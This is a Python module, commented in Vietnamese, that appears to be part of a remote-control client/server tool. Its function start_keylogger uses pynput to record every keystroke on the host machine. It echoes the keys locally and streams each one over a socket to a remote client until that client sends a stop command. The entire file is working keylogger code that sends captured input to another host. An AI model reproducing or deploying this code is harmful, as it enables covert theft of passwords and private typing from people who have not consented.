from pynput import keyboard
import threading

from CRUD import receive_response, send_command


def start_keylogger(client_socket):
    keys_pressed = ""
    MAX_LINE_LENGTH = 50  # Độ dài dòng tối đa trước khi tự động xuống dòng
    stop_keylogger = False  # Biến để kiểm soát việc dừng keylogger
    listener = None

    def on_press(key):
        nonlocal keys_pressed, stop_keylogger  # Sử dụng biến keys_pressed và stop_keylogger trong phạm vi hàm

        if stop_keylogger:
            return False  # Dừng listener

        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char  # Lấy ký tự từ phím nhấn
        else:
            key_str = f' {str(key)} '  # Xử lý các phím đặc biệt

        # Nếu phím nhấn là Enter
        if key == keyboard.Key.enter:
            print(f'\rPhim nhan: {keys_pressed}')  # In ra trên cùng một dòng
            keys_pressed = ""  # Reset sau khi nhấn Enter
            print("", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
        else:
            keys_pressed += key_str  # Cập nhật chuỗi ký tự đã nhấn
            
            # Nếu chuỗi ký tự quá dài, xuống dòng mới mà không lặp lại ký tự
            if len(keys_pressed) > MAX_LINE_LENGTH:
                print(f'\rPhim nhan: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
                keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
            print(f'\rPhim nhan: {keys_pressed}', end='')  # In ra trên cùng một dòng

        # Gửi dữ liệu phím nhấn qua client_socket
        try:
            send_command(client_socket, key_str)          
        except Exception as e:
            print(f'Loi gui du lieu den Client: {e}')
            return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu

    # Lắng nghe phím nhấn từ client
    def listen_for_commands():
        nonlocal stop_keylogger
        try:
            command = receive_response(client_socket)            
            if command == "STOP_KEYLOGGER":                    
                print("\nClient yeu cau tat Keylogger")
                stop_keylogger = True  # Đánh dấu dừng keylogger
                
                # Ngay lập tức dừng listener
                if listener is not None:
                    listener.stop()
                    
        except Exception as e:
            print(f"Loi: khi nhan yeu cau tu Client: {e}")

     # Bắt đầu lắng nghe sự kiện phím nhấn
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # Bắt đầu lắng nghe phím nhấn

    # Bắt đầu lắng nghe lệnh từ client trong một thread riêng
    listener_thread = threading.Thread(target=listen_for_commands)
    listener_thread.start()

    # Chờ thread lắng nghe lệnh kết thúc (nếu cần thiết)
    listener_thread.join()  # Chờ thread lắng nghe lệnh kết thúc

    listener.stop()  # Dừng listener
    send_command(client_socket, "KEYLOGGER_STOPPED")
